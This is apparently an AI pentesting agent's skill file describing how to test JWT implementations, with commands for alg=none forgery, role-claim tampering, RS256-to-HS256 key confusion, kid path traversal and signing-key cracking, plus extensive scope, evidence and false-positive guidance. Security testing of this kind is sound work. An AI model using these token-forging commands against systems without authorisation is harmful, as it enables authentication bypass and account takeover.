---
name: attack-jwt
description: "Validate JWT signature, algorithm, key-selection, and claim-validation weaknesses using test accounts"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - jwt
  - authentication
  - web
  - token
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-287
  - CWE-347
  - CWE-345
chains_with:
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-idor-automation: "JWT tampering + IDOR = full account takeover"
---

# JWT Token Attack

## Objective

Exploit JWT implementation weaknesses to bypass authentication, escalate privileges, or forge tokens.

## Testing Methodology

### Phase 1: Decode & Analyze

```bash
# Automated JWT analysis and tamper token generation
attack_script jwt_tamper EYTOKEN --json-output

# Manual decode
echo "HEADER.PAYLOAD.SIG" | cut -d. -f1 | base64 -d 2>/dev/null
echo "HEADER.PAYLOAD.SIG" | cut -d. -f2 | base64 -d 2>/dev/null
```

Check for:
- Algorithm (`alg` field): RS256, HS256, none
- Claims: `role`, `is_admin`, `sub`, `exp`, `aud`, `iss`
- Key ID (`kid`): SQL injection, path traversal potential

### Phase 2: Algorithm Attacks

```bash
# Generate alg=none token
attack_script jwt_tamper EYTOKEN --set-header alg=none

# Role escalation
attack_script jwt_tamper EYTOKEN --set role=admin --set-header alg=none

# User ID swap
attack_script jwt_tamper EYTOKEN --set sub=1 --set-header alg=none

# HS256 with known/weak key
attack_script jwt_tamper EYTOKEN --set role=admin --key "secret"
```

### Phase 3: Key Confusion (RS256 → HS256)

If server uses RS256, try signing with the public key as HS256 secret:

```bash
# Fetch public key
curl --max-time 15 --connect-timeout 5 -s https://TARGET/.well-known/jwks.json

# Convert JWK to PEM and sign
attack_script jwt_tamper EYTOKEN --set role=admin --key "$(cat public.pem)" --set-header alg=HS256
```

### Phase 4: kid Injection

```bash
# SQL injection via kid
attack_script jwt_tamper EYTOKEN --set-header "kid=../../../../../../dev/null" --key ""

# kid pointing to accessible file
attack_script jwt_tamper EYTOKEN --set-header "kid=/proc/sys/kernel/hostname"
```

### Phase 5: Verify Impact

```bash
# Test tampered token
curl --max-time 15 --connect-timeout 5 -s -H "Authorization: Bearer TAMPERED_TOKEN" https://TARGET/api/admin/users
```

## What Constitutes a Finding

| Attack | Severity |
|--------|----------|
| alg=none accepted — auth bypass | Critical (P1) |
| Role escalation via claim tampering | Critical (P1) |
| RS256→HS256 key confusion | Critical (P1) |
| Weak signing key (crackable) | High (P2) |
| kid SQL injection | Critical (P1) |
| Expired tokens accepted | Medium (P3) |

## Evidence Requirements

- Original JWT decoded (header + payload)
- Tampered JWT with modified claims
- Server response accepting tampered token
- Proof of elevated access (admin data, other user data)

## Tools

- `attack_script jwt_tamper` — automated decode/tamper/re-encode
- `jwt_tool` (external) — comprehensive JWT testing
- `hashcat -m 16500` — JWT secret cracking

## JWT Validation Matrix

Treat each JWT weakness as a separate hypothesis. With a token issued to a test account, test one property at a time and verify the server-side result:

- **Signature and algorithm:** confirm the server rejects altered claims when the signature is invalid and does not accept an algorithm/key-type mismatch.
- **Claims:** check `iss`, `aud`, `exp`, `nbf`, `sub`, and role/scope claims against the application's documented expectations. Decoding a claim does not show that the server trusts it.
- **Key selection:** review `kid`/JWKS behavior for unsafe key selection or stale-key handling without attempting to read arbitrary files or alter production key material.
- **Session lifecycle:** where permitted, verify whether logout, password change, or role removal invalidates previously issued tokens. A long expiry alone is not proof of a vulnerability if revocation is not part of the security contract.

Only claim privilege escalation when the modified token is accepted and a controlled, previously unauthorized operation succeeds. A changed status code or a JWT decoder's warning is not sufficient.

## Verification and False Positives

- Decode-only tools show claims but do not validate a token's signature or prove a vulnerability. Confirm server-side acceptance of the modified token and a concrete authorization change.
- Test with tokens issued to accounts you control. Keep the original token, the exact modification, and the response comparison; redact tokens from reports and logs.
- Treat `alg:none`, algorithm/key confusion, `kid` manipulation, and claim tampering as hypotheses, not findings. Modern libraries may reject them, and a changed response code alone is not proof of privilege escalation.
- For role/subject changes, confirm whether the server accepts the altered claim and grants access to an operation that the test account is not authorized to perform. Do not access real users' data.
- Check expiration, issuer, audience, key rotation, and signature validation independently. A weak token configuration is not automatically exploitable if the server correctly rejects invalid tokens.
- Do not include live secrets, private signing keys, or reusable production tokens in evidence. Use the least-privileged proof that demonstrates the authorization boundary failure.
- [uphiago/recon-skills — JWT attack methodology](https://github.com/uphiago/recon-skills/blob/main/recon/jwt-attack/SKILL.md) (external research reference; not a local Cyber Strike skill path).
- [elementalsouls/Claude-BugHunter — JWT crypto hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-jwt-crypto/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## Token Validation and Safe Proof Matrix

Assess token acceptance against a known-good baseline and vary only one property per test:

| Property | Review | Evidence of a real issue |
|---|---|---|
| Signature | algorithm/key selection and signature enforcement | altered claims accepted without a valid signature |
| Claims | issuer, audience, expiry, not-before, subject, tenant, scopes | token accepted outside its intended issuer, audience, time, or privilege |
| Key selection | key ID, JWK/JWKS source, key rotation | untrusted key material changes trust decisions |
| Token type | access, ID, refresh, reset tokens | one token class accepted in a different security context |
| Revocation/session | logout, password reset, account disable | previously invalidated token still grants meaningful access contrary to policy |
| Authorization | same endpoint with owner and second test identity | claims or scopes permit an unauthorized action |

Never paste production tokens into online decoders or third-party services. Use test tokens, redact secrets, and avoid forging tokens for other users. A weak algorithm configuration or suspicious header is a lead; confirm that the server actually accepts the invalid token and that the accepted claims alter authorization.

Record token type, issuer/audience, redacted header and claims, baseline vs modified behavior, expiry/revocation state, and the exact protected action demonstrated.


## Adaptive Verification Contract (maximum 20 distinct hypotheses)

Treat the attempt budget as a ceiling for independent, evidence-producing hypotheses, not a payload quota. If the signal remains plausible, follow the next relevant branch up to 20 distinct hypotheses; stop earlier when impact is decisive, the branch is irrelevant, or scope/safety limits apply. Cosmetic variations of one request are not independent attempts.

Track each attempt as: hypothesis, one changed variable, baseline/control, observed signal, interpretation, confidence, and next branch. Use controlled identities or synthetic resources, preserve only minimal evidence, and redact secrets.

### Skill-specific hypothesis order

1. Capture a token issued to a test account and document expected issuer, audience, expiry, key/algorithm, and role claims without exposing the token in logs.
2. Establish accepted/rejected controls using a valid test token, an expired token, a malformed token, and a token with one altered claim; change one dimension at a time.
3. Verify signature and algorithm handling, issuer/audience validation, key selection, and token-to-session binding only with tokens and signing material you control. Do not reuse captured third-party tokens or fetch attacker-controlled key URLs against production.
4. Check whether a claim change actually grants a protected capability on a harmless test-owned resource; decoded claims or token acceptance alone are not proof.
5. Redact tokens and keys, re-test with a fresh valid token, and recommend strict algorithm/key allowlists, issuer/audience checks, short lifetimes, revocation strategy, and a regression suite.


### Verdict gates

- **Confirmed:** repeatable security impact is shown against an in-scope resource using a tester-controlled identity or fixture, with a meaningful control.
- **Likely / needs corroboration:** independent signals support the hypothesis but impact or root cause is not yet established.
- **Unconfirmed:** observations are ambiguous, cached, generic, or not tied to a security boundary.
- **Refuted / false positive:** a relevant negative control or valid policy/implementation explanation accounts for the observation; document the attempts instead of claiming all imaginable variants were exhausted.
- Do not treat status codes, error text, response length, decoded tokens, static findings, or UI state alone as proof.

### Stop, cleanup, and handoff

Stop at scope uncertainty, unrelated sensitive data, unexpected production changes, service degradation, secret exposure, or prohibited actions. Restore disposable state and revoke test tokens/sessions where possible. Return the scope proof, baseline, hypothesis, attempt count, impact, controls, confidence/verdict, sanitized evidence pointers, relevant handoff signal and cleanup status. Chain into another skill only when its trigger is present.

## References

- [uphiago/recon-skills — redteam/hunt-oauth](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-oauth/SKILL.md) — JWT and token validation sources.

- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)
